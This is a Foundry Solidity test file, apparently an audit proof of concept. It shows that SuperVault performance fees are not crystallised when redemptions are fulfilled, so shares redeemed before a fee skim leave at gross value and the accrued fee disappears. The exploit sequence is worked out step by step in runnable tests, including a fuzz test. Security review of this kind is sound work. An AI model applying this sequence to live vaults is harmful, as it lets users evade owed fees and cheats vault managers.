// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.30;

import { Test } from "forge-std/Test.sol";
import { MessageHashUtils } from "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";

import { SuperGovernor } from "../../src/SuperGovernor.sol";
import { SuperVaultAggregator } from "../../src/SuperVault/SuperVaultAggregator.sol";
import { SuperVault } from "../../src/SuperVault/SuperVault.sol";
import { SuperVaultStrategy } from "../../src/SuperVault/SuperVaultStrategy.sol";
import { SuperVaultEscrow } from "../../src/SuperVault/SuperVaultEscrow.sol";
import { ECDSAPPSOracle } from "../../src/oracles/ECDSAPPSOracle.sol";
import { ISuperVaultAggregator } from "../../src/interfaces/SuperVault/ISuperVaultAggregator.sol";
import { ISuperVaultStrategy } from "../../src/interfaces/SuperVault/ISuperVaultStrategy.sol";
import { IECDSAPPSOracle } from "../../src/interfaces/oracles/IECDSAPPSOracle.sol";
import { MockERC20 } from "../mocks/MockERC20.sol";

/// @notice Demonstrates that accrued performance fees are not crystallised during
/// redemption fulfillment, allowing shares to exit at gross PPS before a skim.
contract PreSkimRedeemFeeEscapePoC is Test {
    using MessageHashUtils for bytes32;

    uint256 internal constant VALIDATOR_1_KEY = 0xA11CE;
    uint256 internal constant VALIDATOR_2_KEY = 0xB0B;

    SuperGovernor internal governor;
    SuperVaultAggregator internal aggregator;
    ECDSAPPSOracle internal oracle;
    MockERC20 internal asset;
    SuperVault internal vault;
    SuperVaultStrategy internal strategy;

    address internal manager;
    address internal user;

    function setUp() public {
        manager = makeAddr("manager");
        user = makeAddr("user");

        governor = new SuperGovernor(
            address(this),
            address(this),
            address(this),
            address(this),
            address(this),
            address(this),
            makeAddr("treasury"),
            false
        );

        address vaultImpl = address(new SuperVault(address(governor)));
        address strategyImpl = address(new SuperVaultStrategy(address(governor)));
        address escrowImpl = address(new SuperVaultEscrow());

        aggregator = new SuperVaultAggregator(address(governor), vaultImpl, strategyImpl, escrowImpl);
        governor.setAddress(governor.SUPER_VAULT_AGGREGATOR(), address(aggregator));

        asset = new MockERC20("Asset", "ASSET", 18);

        (address vaultAddress, address strategyAddress,) = aggregator.createVault(
            ISuperVaultAggregator.VaultCreationParams({
                asset: address(asset),
                name: "Pre-Skim Exit Vault",
                symbol: "PSEV",
                mainManager: manager,
                secondaryManagers: new address[](0),
                minUpdateInterval: 5,
                maxStaleness: 300,
                feeConfig: ISuperVaultStrategy.FeeConfig({
                    performanceFeeBps: 1_000,
                    managementFeeBps: 0,
                    recipient: manager
                })
            })
        );

        vault = SuperVault(vaultAddress);
        strategy = SuperVaultStrategy(payable(strategyAddress));

        vm.prank(manager);
        aggregator.updateDeviationThreshold(address(strategy), 1e18);

        oracle = new ECDSAPPSOracle(address(governor), "SuperformOraclePPS", "1");

        address[] memory validators = new address[](2);
        validators[0] = vm.addr(VALIDATOR_1_KEY);
        validators[1] = vm.addr(VALIDATOR_2_KEY);
        bytes[] memory publicKeys = new bytes[](2);

        governor.setValidatorConfig(1, validators, publicKeys, 2, "");
        governor.proposeActivePPSOracle(address(oracle));
        vm.warp(block.timestamp + 7 days);
        governor.executeActivePPSOracleChange();
        _updatePPS(1 ether);

        asset.mint(user, 100 ether);
        vm.startPrank(user);
        asset.approve(address(vault), type(uint256).max);
        vault.deposit(100 ether, user);
        vm.stopPrank();

        asset.mint(address(strategy), 100 ether);
        _updatePPS(2 ether);

        assertEq(vault.totalSupply(), 100 ether);
        assertEq(asset.balanceOf(address(strategy)), 200 ether);
        assertEq(strategy.vaultHwmPps(), 1 ether);
    }

    function test_Control_SkimBeforeExitCrystallisesTenAssetFee() public {
        uint256 managerBefore = asset.balanceOf(manager);

        vm.prank(manager);
        strategy.skimPerformanceFee();

        assertGt(asset.balanceOf(manager) - managerBefore, 0);
        assertEq(asset.balanceOf(address(strategy)), 190 ether);
        assertEq(aggregator.getPPS(address(strategy)), 1.9 ether);
    }

    function test_PoC_RedeemBeforeSkimEscapesAllAccruedPerformanceFee() public {
        vm.prank(user);
        vault.requestRedeem(100 ether, user, user);

        address[] memory controllers = new address[](1);
        controllers[0] = user;
        uint256[] memory outputs = new uint256[](1);
        outputs[0] = 200 ether;

        vm.prank(manager);
        strategy.fulfillRedeemRequests(controllers, outputs);

        assertEq(vault.totalSupply(), 0, "all fee-bearing shares were burned");
        assertEq(vault.maxWithdraw(user), 200 ether);
        assertEq(asset.balanceOf(vault.escrow()), 200 ether);

        uint256 managerBefore = asset.balanceOf(manager);
        vm.prank(manager);
        strategy.skimPerformanceFee();

        assertEq(asset.balanceOf(manager), managerBefore, "no performance fee can be collected");

        vm.prank(user);
        vault.withdraw(200 ether, user, user);

        assertEq(asset.balanceOf(user), 200 ether, "user exits with gross pre-fee value");
        assertEq(asset.balanceOf(address(strategy)), 0);
        assertEq(asset.balanceOf(vault.escrow()), 0);
    }

    function test_PoC_AccruedFeeShrinksWithEveryShareBurnedBeforeSkim() public {
        vm.prank(user);
        vault.requestRedeem(50 ether, user, user);

        address[] memory controllers = new address[](1);
        controllers[0] = user;
        uint256[] memory outputs = new uint256[](1);
        outputs[0] = 100 ether;

        vm.prank(manager);
        strategy.fulfillRedeemRequests(controllers, outputs);

        assertEq(vault.totalSupply(), 50 ether);

        uint256 strategyBefore = asset.balanceOf(address(strategy));
        vm.prank(manager);
        strategy.skimPerformanceFee();
        uint256 collected = strategyBefore - asset.balanceOf(address(strategy));

        assertEq(collected, 5 ether);
    }

    /// @notice For every whole share redeemed before collection, exactly 10% of that
    /// share's one-asset gain disappears from the fee base. The user chooses the
    /// redeemed amount; the manager only performs ordinary fulfillment.
    function testFuzz_PoC_UserControlledBurnProportionallyErasesAccruedFee(uint8 redeemedWholeShares) public {
        uint256 redeemedShares = bound(uint256(redeemedWholeShares), 1, 100) * 1 ether;

        vm.prank(user);
        vault.requestRedeem(redeemedShares, user, user);

        address[] memory controllers = new address[](1);
        controllers[0] = user;
        uint256[] memory outputs = new uint256[](1);
        outputs[0] = redeemedShares * 2;

        vm.prank(manager);
        strategy.fulfillRedeemRequests(controllers, outputs);

        uint256 expectedFeeBeforeRedemption = 10 ether;
        uint256 expectedFeeAfterRedemption = (100 ether - redeemedShares) / 10;
        uint256 expectedFeeErased = redeemedShares / 10;

        uint256 strategyBefore = asset.balanceOf(address(strategy));
        vm.prank(manager);
        strategy.skimPerformanceFee();
        uint256 feeCollected = strategyBefore - asset.balanceOf(address(strategy));

        assertEq(feeCollected, expectedFeeAfterRedemption, "fee is calculated only on remaining supply");
        assertEq(
            expectedFeeBeforeRedemption - feeCollected,
            expectedFeeErased,
            "burned share fraction permanently disappears from accrued fee liability"
        );
    }

    function _updatePPS(uint256 newPPS) internal {
        vm.warp(block.timestamp + 10);
        uint256 timestamp = block.timestamp;
        bytes[] memory proofs = _createProofs(address(strategy), newPPS, timestamp);
        oracle.updatePPS(_singleUpdateArgs(address(strategy), newPPS, timestamp, proofs));
        assertEq(aggregator.getPPS(address(strategy)), newPPS);
    }

    function _createProofs(
        address strategy_,
        uint256 pps,
        uint256 timestamp
    ) internal returns (bytes[] memory proofs) {
        bytes32 structHash = keccak256(
            abi.encodePacked(
                oracle.UPDATE_PPS_TYPEHASH(),
                strategy_,
                pps,
                timestamp,
                oracle.noncePerStrategy(strategy_)
            )
        );
        bytes32 digest = oracle.domainSeparator().toTypedDataHash(structHash);

        uint256 firstKey = VALIDATOR_1_KEY;
        uint256 secondKey = VALIDATOR_2_KEY;
        if (vm.addr(firstKey) > vm.addr(secondKey)) {
            (firstKey, secondKey) = (secondKey, firstKey);
        }

        proofs = new bytes[](2);
        (uint8 v1, bytes32 r1, bytes32 s1) = vm.sign(firstKey, digest);
        (uint8 v2, bytes32 r2, bytes32 s2) = vm.sign(secondKey, digest);
        proofs[0] = abi.encodePacked(r1, s1, v1);
        proofs[1] = abi.encodePacked(r2, s2, v2);
    }

    function _singleUpdateArgs(
        address strategy_,
        uint256 pps,
        uint256 timestamp,
        bytes[] memory proofs
    ) internal pure returns (IECDSAPPSOracle.UpdatePPSArgs memory args) {
        address[] memory strategies = new address[](1);
        strategies[0] = strategy_;

        bytes[][] memory proofsArray = new bytes[][](1);
        proofsArray[0] = proofs;

        uint256[] memory ppss = new uint256[](1);
        ppss[0] = pps;

        uint256[] memory timestamps = new uint256[](1);
        timestamps[0] = timestamp;

        args = IECDSAPPSOracle.UpdatePPSArgs({
            strategies: strategies,
            proofsArray: proofsArray,
            ppss: ppss,
            timestamps: timestamps
        });
    }
}
